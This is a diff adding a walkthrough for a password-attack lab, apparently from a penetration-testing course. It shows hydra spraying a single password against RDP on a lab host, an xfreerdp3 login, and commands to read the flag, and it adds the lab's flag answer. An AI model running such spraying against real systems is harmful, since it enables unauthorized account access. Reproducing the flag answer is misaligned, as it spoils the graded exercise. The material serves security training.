@@ -21,9 +21,30 @@ Spraying a password on RDP service
 
 Lab 1 - Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on Password Attacks - RDP - VM #1. Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames: justin and daniel.
 >``` shell
+># 1) Create a custom username list with only the two known users to speed up password spraying
+>kali@kali:~$ echo -e "justin\ndaniel" > rdp_users.txt
 >
+># 2) Verify the contents of the custom username list
+>kali@kali:~$ cat rdp_users.txt
+>
+># 3) Perform a password spraying attack against the RDP service using a single known password (-L specifies the username list, -p specifies the single password to spray)
+>kali@kali:~$ hydra -L rdp_users.txt -p "SuperS3cure1337#" rdp://192.168.185.202
+>
+># 4) RDP into the target using one of the valid credentials discovered by Hydra
+>kali@kali:~$ xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.185.202 /cert:ignore
+>
+># 5) (On the target) Open PowerShell after logging in via RDP
+>
+># 6) Navigate to the logged-in user's Desktop directory
+>PS C:\Users\justin> cd C:\Users\justin\Desktop
+>
+># 7) List files on the Desktop to locate the flag file
+>PS C:\Users\justin\Desktop dir
+>
+># 8) Display the contents of the flag file to complete the lab
+>PS C:\Users\justin\Desktop type flag.txt
 >```
->
+>OS{c30a329fa280f0c3177d2d9dcae63744}
 
 Lab 2 - Enumerate Password Attacks - RDP - VM #1 and find another network service. Use the knowledge from this section to get access as the itadmin user and find the flag.
 >``` shell
